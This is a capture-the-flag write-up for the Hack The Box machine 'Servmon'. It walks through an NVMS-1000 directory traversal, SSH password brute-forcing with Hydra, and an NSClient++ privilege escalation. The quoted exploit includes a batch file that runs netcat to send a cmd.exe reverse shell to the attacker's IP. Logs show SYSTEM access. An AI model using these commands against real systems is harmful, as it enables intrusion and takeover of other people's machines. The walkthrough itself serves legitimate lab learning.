# Servmon

This box is a hell because sometimes fails and the connection is horrible... I had to stop getting the root flag and retry some days after.

## Getting User Flag

The first thing we can see is an HTTP and HTTPS different services, and also a FTP server with anonymous access.

Starting with the HTTP one, it's named "NVMS 1000", and we can find a exploit for it using searchsploit:

```
kali@kali:~$ searchsploit nvms
-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
NVMS 1000 - Directory Traversal                                           | exploits/hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification          | exploits/multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow                        | exploits/multiple/dos/32193.txt
-------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
kali@kali:~$ cat /usr/share/exploitdb/exploits/hardware/webapps/47774.txt 
# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan Türle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1kali@kali:~$ 
```

So, lets try using burpsuite, and voi la, it works, but after researching, we haven't any interesting thing.

Now, we tried with the FTP, and we get two usernames and some interesting files:
Note: The complete log of the FTP actions I did is in the "ftp.log" file. 

These are the files I found:
```
>>> Confidential.txt 
	Nathan,

	I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

	Regards

	Nadine
>>> Notes\ to\ do.txt 
	1) Change the password for NVMS - Complete
	2) Lock down the NSClient Access - Complete
	3) Upload the passwords
	4) Remove public access to NVMS
	5) Place the secret files in SharePoint

>>> Passwords.txt
	1nsp3ctTh3Way2Mars!
	Th3r34r3To0M4nyTrait0r5!
	B3WithM30r4ga1n5tMe
	L1k3B1gBut7s@W0rk
	0nly7h3y0unGWi11F0l10w
	IfH3s4b0Utg0t0H1sH0me
	Gr4etN3w5w17hMySk1Pa5$
```

So let's use this passwords with both users:

```
>>> kali@kali:~/CTFs/testing$ hydra -l Nadine -P passwords.txt ssh://10.10.10.184
	Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-21 23:31:18
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
	[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
	[DATA] attacking ssh://10.10.10.184:22/
	[22][ssh] host: 10.10.10.184   login: Nadine   password: L1k3B1gBut7s@W0rk
	1 of 1 target successfully completed, 1 valid password found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-21 23:31:20
```

Got user flag!

## The System flag
This is the worst part of the box, because of many falls of the webservice.

Now we have to see the HTTPS service, named NSClient++
Note: In Firefox sometimes doesn't appear a login box. Try with chromium or Opera.

When we try to log in the web, it says "403 Your not allowed", and this is interesting because it doesn't say "incorrect credentials". 
Let's use our user for seeing the configure of this application.

```
>>> nadine@SERVMON C:\Program Files\NSClient++>more nsclient.ini

	╗┐# If you want to fill this file with all available options run the following command:                                   
	#   nscp settings --generate --add-defaults --load-all                                                                     
	# If you want to activate a module and bring in all its options use:                                                       
	#   nscp settings --activate-module <MODULE NAME> --add-defaults                                                           
	# For details run: nscp settings --help                                                                                    
	                                                                                                                           
	                                                                                                                           
	; in flight - TODO                                                                                                         
	[/settings/default]                                                                                                        
	                                                                                                                           
	; Undocumented key                                                                                                         
	password = ew2x6SsGTxjRwXOT                                                                                                
	                                                                                                                           
	; Undocumented key                                                                                                         
	allowed hosts = 127.0.0.1                                                                                                  
	                                                                                                                           
	                                                                                                                           
	; in flight - TODO                                                                                                         
	[/settings/NRPE/server]                                                                                                    
	                                                                                                                           
	; Undocumented key                                                                                                         
	ssl options = no-sslv2,no-sslv3                                                                                            
	                                                                                                                           
	; Undocumented key                                                                                                         
	verify mode = peer-cert                                                                                                    

	; Undocumented key
	insecure = false


	; in flight - TODO
	[/modules]

	; Undocumented key
	CheckHelpers = disabled

	; Undocumented key
	CheckEventLog = disabled

	; Undocumented key
	CheckNSCP = disabled

	; Undocumented key
	CheckDisk = disabled

	; Undocumented key
	CheckSystem = disabled

	; Undocumented key
	WEBServer = enabled

	; Undocumented key
	NRPEServer = enabled

	; CheckTaskSched - Check status of your scheduled jobs.
	CheckTaskSched = enabled

	; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA
	Scheduler = enabled

	; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled


; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded
 by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the actual script an %ARGS% will be repla
ced by any given arguments.
[/settings/external scripts/wrappings]

; Batch file - Command used for executing wrapped batch files
bat = scripts\\%SCRIPT% %ARGS%

; Visual basic script - Command line used for wrapped vbs scripts
vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%

; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts
ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."; exit(3) 
}; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofile -command -


; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arg
uments`
[/settings/external scripts/scripts]


; Schedules - Section for the Scheduler module.
[/settings/scheduler/schedules]

; Undocumented key
foobar = command = foobar


; External script settings - General settings for the external scripts module (CheckExternalScripts).
[/settings/external scripts]
allow arguments = true
```

So, we have the password, but we only can connect from 127.0.0.1, so we could use curl... Or we can make a port forwarding.
For the last one, the only thing we must have is sshing again with this command:

```
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```

Now, the 8443 port in our 127.0.0.1 will be redirect to the victims 8443 throw the SSH.
If now we open a new tab in our navigator and go to 127.0.0.1:8443 we'll get the same website, but now the password "ew2x6SsGTxjRwXOT" works.

We must realize that we have another exploit for this webservice:

```
kali@kali:~$ searchsploit nsclient
-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
NSClient++ 0.5.2.35 - Privilege Escalation                                | exploits/windows/local/46802.txt
-------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
kali@kali:~$ cat /usr/share/exploitdb/exploits/windows/local/46802.txt 
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.  From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule those scripts to run.  There doesn't seem to be restrictions on where the scripts are called from, so the user can create the script anywhere.  Since the NSClient++ Service runs as Local System, these scheduled scripts run as that user and the low privilege user can gain privilege escalation.  A reboot, as far as I can tell, is required to reload and read the changes to the web config.  

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
        C:\Program Files\NSClient++>nscp web -- password --display
        Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
        @echo off
        c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
        nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
        - foobar
                command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
        - foobar
                interval = 1m
                command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
        nc -nlvvp 443
        listening on [any] 443 ...
        connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
        Microsoft Windows [Version 10.0.17134.753]
        (c) 2018 Microsoft Corporation. All rights reserved.

        C:\Program Files\NSClient++>whoami
        whoami
        nt authority\system

Risk:
The vulnerability allows local attackers to escalate privileges and execute arbitrary code as Local Systemkali@kali:~$ 
```

So let's work with this script:

We already have the administrator password and those modules are already enabled (we see this navigating to the "modules" tab).
Lets create the evil.bat file, download netcat and copy all using:

```
scp ./* Nadine@10.10.10.184:/temp
```

Before anything, let's test that evil.bat works.
If we open a nc listener in our machine and execute evil.bat, we will have a reverse shell with Nadine rights.

Let's continue. The website is a bit confuse, so I'll explain it for the 5th step:
Go to settings, click on external scripts and again in scripts.
Now click on "+Add new" tab and, in Section, append /foobar at the end (in my case, it remains like "/settings/external scripts/scripts/foobar").
In Key you must write "command", and in Value, "c:\temp\evil.bat".


IMPORTANT: We don't need to do the six step nor restart the computer.
Now open a netcat listening on our machine and (in NSClient++) go to the Console tab.
Write into it "reload", and then "foobar". No more is needed.

```
kali@kali:~/CTFs/Writeups/eternals/HTB/ServMon_SPOILER/netcat$ sudo nc -nlvp 1999
listening on [any] 1999 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.184] 50513
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```

Have a nice day =)